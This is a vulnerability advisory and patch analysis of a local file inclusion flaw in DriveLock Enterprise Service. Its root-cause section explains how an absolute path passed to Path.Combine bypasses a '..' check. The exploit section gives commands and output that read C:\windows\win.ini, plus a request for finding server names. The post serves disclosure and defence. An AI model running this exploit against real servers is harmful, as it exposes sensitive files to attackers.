---
layout: post_collection_entry
date:   2026-03-01
categories: [patch analysis]
advisory_collection: drivelock_multi_2026_patch_analysis

title:  "[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Local File Inclusion, diagnosticFetchFile"
advisory:
  product: DriveLock
  homepage: https://www.drivelock.com/
  vulnerable_version: "< 25.2.4, < 25.1.7, < 24.2.9"
  fixed_version: "25.2.4, 25.1.7, 24.2.9"
  found: 2026-02-27
  cve: "ToDo"
  impact_text: MEDIUM
  impact_score: 4.9
  cvss: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
---

# Product description
> The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
> This means you are secure at the centre, with all paths of access to your sensitive data blocked.

*Cite: [DriveLock - Homepage](https://www.drivelock.com/en/)*

This platform includes the `DriveLock Core` component, which is an agent installed on the client machines.

# Overview
It is possible to download any file from the servers filesystem as a logon user with `Infrastructure_Manage` permissions. The server does not properly validate the user provided input.

**Privileges Required**
* User required: `true`
* Permission: `PermissionType.Infrastructure_Manage`

## Impact
An attacker can access sensitive data stored on the servers filesystem.


# Root Cause Analysis
The endpoint `/api/administration/infrastructure/diagnosticFetchFile` accepts different path parameters. One of them is the `subFolderAndFile` parameter, which is used to build the full path of the file to download.

```c#
// FILE - DriveLock.EnterpriseServer.ServiceBroker/DriveLock.EnterpriseServer.ServiceBroker/DiagnosticFileHandling.cs
FUNCTION FetchFile(OUT data, folderId, pathAndFile, pos, count):

    // 1. Resolve known folder
    knownFolder = GetKnownFolder(folderId)
    IF knownFolder IS NULL OR EMPTY THEN
        data = NULL
        RETURN Result(false, "Unknown folder")
    END IF
    // 2. Prevent path traversal
    IF pathAndFile CONTAINS ".." THEN
        data = NULL
        RETURN Result(false, "Not allowed subfolder")
    END IF
    // 3. Handle empty read request
    IF count == 0 THEN
        data = NEW BYTE_ARRAY(size = 0)
        RETURN Result(true)
    END IF

    TRY
        // 4. Build full file path
        fullPath = CombinePath(knownFolder, pathAndFile)
        // 5. Ensure file exists
        IF FileExists(fullPath) IS FALSE THEN
            data = NULL
            RETURN Result(false, "File '" + fullPath + "' does not exist")
        END IF
        data = ReadBytesFromFile(fullPath, startPosition = pos, length = count)

    RETURN Result(true)
END FUNCTION

```

As shown above the `pathAndFile` (`subFolderAndFile` in the route definition) parameter is validated and a check is performed that it does not include `..`  to move up to a parent directory. Thus the value `./../../../../windows/win.ini` would be rejected. But it does not test if the provided path is a full qualified path like `C:\windows\win.ini`.

This lack of validation can be exploit, because the function `Path.Combine` is used to construct the full path - `string text = Path.Combine(knownFolder, pathAndFile);`.

As the documentation states:

> **Important**
> This method assumes that the first argument is an absolute path and that the following argument or arguments are relative paths. If this is not the case, and particularly if any subsequent arguments are strings input by the user, call the Join or TryJoin method instead.

**CITE: https://learn.microsoft.com/en-us/dotnet/api/system.io.path.combine?view=net-10.0**

if any of the parts is absolute, this is used as the new base.

For example:
```c#
Path.Combine("C:\\temp\\foobar", "message.txt"); // --> C:\temp\foobar\message.txt
Path.Combine("C:\\temp\\foobar", "C:\\windows\\message.txt"); // --> C:\\windows\\message.txt
```

# Proof of Concept / Exploit
Setup `JWT`, `DES_NAME` environment var and run the included [PoC - webUI-diagnosticFetchFile](/assets/drivelock/poc/poc-lfi-webUI-diagnosticFetchFile.sh):
```sh
❯ export JWT="XXX"
❯ export DES_NAME="XXX"
❯ ./poc-lfi-webUI-diagnosticFetchFile.sh
```

## Exploit
The following demonstrates the usage of the exploit suite:

```bash
❯ uv run -m drivelock.exploit -t doetess -u stuxxn -P '!23456Qwertz' lfi diagnosticFetchFile packer-win2019.pentest.lab 'C:/windows/win.ini'
[INFO] URL: https://des-25-2-2.pentest.lab:4568/api/administration/auth/login
[INFO] Login as - tenant: doetess, user: stuxxn
[INFO] Setup JWT for http.client
[DEBUG] Token: XXX
[INFO] Trying to download file: C:\windows\win.ini
[INFO] URL: https://des-25-2-2.pentest.lab:4568/api/administration/infrastructure/diagnosticFetchFile/packer-win2019.pentest.lab/1/C:\windows\win.ini/5242880
File content:
b'; for 16-bit app support\r\n[fonts]\r\n[extensions]\r\n[mci extensions]\r\n[files]\r\n[Mail]\r\nMAPI=1\r\n'

```

To get the `DES` name, required for the exploit, use the `/api/administration/infrastructure/listDes` endpoint.

```http
POST /api/administration/infrastructure/listDes HTTP/2
Host: 192.168.60.10:4568
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer XXX
Lang: en
Origin: https://192.168.60.10:4568
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```
```json
{
    "servers": [
        {
            "desName": "packer-win2019.pentest.lab",
            "desType": 1,
            "httpAddress": "https://packer-win2019.pentest.lab:6067",
            "tenant": "root"
        }
    ]
}
```

# Solution
Patch for version 25.2, 25.1 and 24.2 were published on 2026-02-20, which fixes the vulnerability.
Patched versions:

    25.2.4
    25.1.7
    24.2.9

No other mitigations are known.